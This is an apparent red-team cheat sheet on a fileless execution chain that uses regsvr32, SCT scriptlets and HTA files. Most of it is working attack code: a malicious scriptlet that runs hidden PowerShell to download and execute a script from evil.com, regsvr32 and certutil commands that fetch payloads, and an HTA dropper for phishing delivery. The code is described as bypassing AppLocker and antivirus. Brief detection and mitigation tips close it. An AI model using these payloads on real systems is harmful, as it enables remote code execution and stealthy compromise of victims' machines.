# 📜 Regsvr32 + SCT + HTA - Fileless Execution Chain

This technique chains **regsvr32**, **.sct scriptlets**, and **HTA delivery** into a powerful **fileless payload execution method**. It's stealthy, trusted, and widely used by red teams and APT malware.

> ⚠️ Fileless execution + no disk writes = hard to detect. Use only in simulated red team labs or defense research.

---

## 🛠️ What It Does
- Drops or loads `.sct` (XML scriptlet) files from a remote source
- Uses `regsvr32.exe` (signed Microsoft binary) and `scrobj.dll`
- Can be triggered via an `.hta` payload or manually
- Bypasses AppLocker/WDAC and many AVs

---

## 💣 The Chain

### 1. Malicious `.sct` Scriptlet
**malicious.sct:**
```xml
<scriptlet>
<registration
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    description="Example">
<script language="VBScript">
    CreateObject("Wscript.Shell").Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
</script>
</registration>
</scriptlet>
```
✅ Full stager runs remotely and filelessly

---

### 2. Regsvr32 Execution
```cmd
regsvr32 /s /n /u /i:http://evil.com/malicious.sct scrobj.dll
```
✅ Pulls `.sct` from attacker domain, executes without writing to disk

---

### 3. Optional: Trigger via HTA
**dropper.hta:**
```html
<script>
var sh = new ActiveXObject("WScript.Shell");
sh.Run("regsvr32 /s /n /u /i:http://evil.com/malicious.sct scrobj.dll");
</script>
```
✅ Delivered via phishing or drive-by download — invisible to the user

---

### 4. Or Drop .sct Locally (Staged Variant)
```cmd
certutil -urlcache -split -f http://evil.com/malicious.sct .\sct.sct
regsvr32 /s /n /u /i:sct.sct scrobj.dll
```
✅ Leaves file trace but still stealthier than traditional droppers

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| `regsvr32` calling `scrobj.dll` | Very rare in normal environments — alert immediately |
| .sct download over HTTP/S | Monitor for `.sct` extensions in web traffic |
| HTA file execution from browser or email | Flag untrusted `.hta` files being opened by MSHTA.EXE

---

## 🔐 Mitigation Strategies
- Block `regsvr32.exe` if unused (use AppLocker/WDAC)
- Detect and alert on HTA file delivery and execution
- Inspect memory-resident payloads (EDR) for scriptlet execution
- Limit outbound HTTP/S from workstations to unknown domains

---

> 🧠 This chain is one of the stealthiest LoL-based execution paths. Red teams use it to launch full post-exploitation frameworks — and defenders often miss it entirely without behavior-based detection.
